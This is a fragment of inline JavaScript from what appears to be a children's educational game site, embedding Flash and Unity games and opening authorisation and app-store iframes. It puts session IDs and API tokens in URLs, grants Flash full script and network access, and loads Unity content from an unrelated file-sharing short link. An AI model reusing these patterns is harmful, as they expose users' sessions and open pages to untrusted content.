        function ContentAuthorization(gameObject){
            unityCBContentAuthorization = gameObject || null;
            returnFlagContentAuthorization = false;
            ka.centerContainer = false; 
            if (ka.contentAuthorizationPanel.children().length <= 0) {
                $(
                "<div style='position:relative;'><a href='#' id='close-btn' class='close'></a><iframe id='ifrm-member' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='no' src='{2}?token={3}&loc={4}'></iframe></div>".format(550, 550, '/HomePage/ContentAuthorizationMinified.aspx', GetApiToken(), unityCBContentAuthorization.toString())
                ).appendTo(ka.contentAuthorizationPanel); 
		    }
		    else {		        
		        $('#ifrm-member').attr('src', '{0}?token={1}&loc={2}'.format('/HomePage/ContentAuthorizationMinified.aspx', GetApiToken(), unityCBContentAuthorization.toString()));
		    }
		    openOverlayContentAuthorization(ka.contentAuthorizationPanel);
        }
        
        

        function flashLoaded() {
            document.getElementById("worldShell").PlayFlashGame(ka.currenFlashGame);
        }
        function loadSwf(remotingURL, embedURL, playerId, gameId, requestSceneId, enablePolling, gameUrl, gameW, gameH, gameBgColor, gameScalable, gameMaxPlayer, _sid) {
            var miniGameFlashvars = {};
            miniGameFlashvars.remotingURL = remotingURL;
            miniGameFlashvars.gameId = gameId;
            miniGameFlashvars.playerId = playerId;
            miniGameFlashvars.requestSceneId = requestSceneId;
            miniGameFlashvars.enablePolling = enablePolling;
            miniGameFlashvars.pollInterval = 1000;
            miniGameFlashvars.comType = embedURL != null ? "embed" : "net";
            miniGameFlashvars.embedURL = embedURL;
            miniGameFlashvars.SESSID = _sid;
            gameUrl += "?SESSID=" + _sid;

            var miniGameParams = {};
            miniGameParams.bgcolor = gameBgColor;
            miniGameParams.wmode = "window";
            miniGameParams.salign = "tl";
            miniGameParams.scale = "showall";
            miniGameParams.allowScriptAccess = "always";
            miniGameParams.allowNetworking = "all";
            var miniGameDiv = document.getElementById("gameDiv");
            if (!miniGameDiv) {
                var d = document.createElement("div");
                d.setAttribute("id", "gameDiv");
                var worldshell = document.getElementById("worldShell");
                document.getElementById("flash-content").insertBefore(d, worldshell);                
            }
            var attributes = {};
            attributes.styleclass = "noOutline";
            gameW = ka.screenSize.gameWidth;
            gameH = ka.screenSize.gameHeight;
            swfobject.embedSWF(gameUrl, "gameDiv", gameW, gameH, "9.0.115", "expressInstall.swf", miniGameFlashvars, miniGameParams, attributes);
            var gameDiv = document.getElementById("gameDiv");
            gameDiv.width = gameW;
            gameDiv.height = gameH;
            gameDiv.style.left = ka.screenSize.gameLeft;
            gameDiv.style.top = ka.screenSize.gameTop;
            window.document.gameDiv.focus();
        }
        function GetUnity() {
            return unityObject.getObjectById('unity-content');
        }
        function embedUnity(container, uWidth, uHeight) { 
            if (typeof unityObject != "undefined") {
                var params = {
                    backgroundcolor: "bfe4fc",
                    textcolor: "3233cb",
                    logoimage: '/assets/MyLogo.png',
                    progressbarimage: '/assets/MyProgressBar.png',
                    progressframeimage: '/assets/MyProgressFrame.png',
                    disableContextMenu: true
                };
                unityObject.embedUnity(container, "//easysha.red/dl/cscaknom", uWidth, uHeight, params, null, function(result) {
                    if (result.success) {
                    }
                });
            }
        }   
        function addHiddenField(fm, k, v) {
            var hd = document.createElement("input");
            hd.setAttribute("type", "hidden");
            hd.setAttribute("name", k);
            hd.setAttribute("value", v);
            fm.appendChild(hd);
        }
        function launchMB(m,k,d){
            var form = document.createElement("form");
            form.setAttribute("method", "POST");
            form.setAttribute("action", 'http://www.mathblaster.com/xss.aspx');
            addHiddenField(form, "d", d);
            addHiddenField(form, "k", k);
            addHiddenField(form, "m", m);
            document.body.appendChild(form);
            form.submit();
            if(subcriptionID == 1 && window.opener){
	            window.opener.location.reload(true);
	        }
        }     
        function OpenAppStore (cb) {
            var appStore = $('#app-store');
            if (appStore.children().length <= 0) {
                var s = ka.screenSize;
                $("<div style='position:relative;padding:10px 0 0 0;'><a href='#' id='close-btn' class='close' style='top:5px; right:-2px;'></a><iframe id='ifrm-store' frameborder='0' height='{0}px' width='{1}px' marginheight='0' marginwidth='0' scrolling='yes' src='//itunes.apple.com/us/app/jumpstart-preschool-magic/id395058540?ls=1&mt=8'></iframe></div>".format(s.height - 40, s.width -40)).appendTo(appStore);
            } else {
                $('#ifrm-store').attr('src', '//itunes.apple.com/us/app/jumpstart-preschool-magic/id395058540?ls=1&mt=8');
            }
            appStore.overlay({
                expose: { color: '#fff', loadSpeed: 100, opacity: 0.5 },
                closeOnClick: false,
                fixed: false,
                api: true,
                onClose: function() { GetUnity().SendMessage(cb, "AppStoreReturn", null);; }
            }).load();
            appStore.css('display', 'block');
            appStore.center();
        } 
        
        $(document).ready(function() {    
            if (typeof unityObject != "undefined") {
                unityObject.detectUnity(function(r) {
                   
                });
            }
            
            ka.container.css('width', ka.screenSize.width + 'px');
            ka.container.css('height', ka.screenSize.height + 'px');
            
            document.body.style.overflow = 'hidden';
            
            ka.container.center();
            
            $(window).load(function(){        
                embedUnity('unity-content', ka.screenSize.width, ka.screenSize.height);
                if($("iframe").length)
                $("iframe").scrolling = "no";
            });
            window.onresize = function() {              
                if (ka.centerContainer) {
                    ka.container.center();
                }
                $('#app-store').center();
                ka.membershipPanel.center();
                ka.recorderPanel.center();
                ka.playerPanel.center();
                if($("iframe").length)
                    $("iframe").scrolling = "no";
            };
        });  
        
        function SetUnityGameData(d)
        {
            UnityGameData=d;
        }        
        
        function GetUnityGameData()
        {
            if (UnityGameData == null)
				return "";
				
            return UnityGameData;
        }
    </script>

     
    <script type='text/javascript' src="//cdn.optimizely.com/js/64230332.js"></script>
     
</body>
</html>
